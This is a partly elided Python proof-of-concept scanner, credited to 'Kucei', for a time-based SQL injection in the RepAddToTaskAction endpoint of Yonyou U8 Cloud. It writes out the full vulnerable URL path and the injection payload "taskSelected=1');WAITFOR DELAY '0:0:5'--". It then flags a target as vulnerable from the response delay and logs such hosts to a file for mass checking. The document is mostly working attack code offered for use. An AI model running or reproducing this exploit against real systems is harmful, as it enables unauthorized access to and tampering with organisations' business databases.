...
def bunner():
    ...
    \x1b[33m ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
        --author:Kucei  --Vession:用友U8_Cloud_RepAddToTaskAction_SQL
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)
...
def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("用友U8_Cloud_RepAddToTaskAction_SQL")
...
def poc(target):
    url_payload1 = "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1"
    url_payload2 = "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:5%27--"
    headers = {
    ...
    try :
        ...
        if response1.status_code == 200 and time2 - time1 >= 4.5:
            print( f"[+] {target} 存在漏洞")
            with open('用友U8_Cloud_RepAddToTaskAction_SQL.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
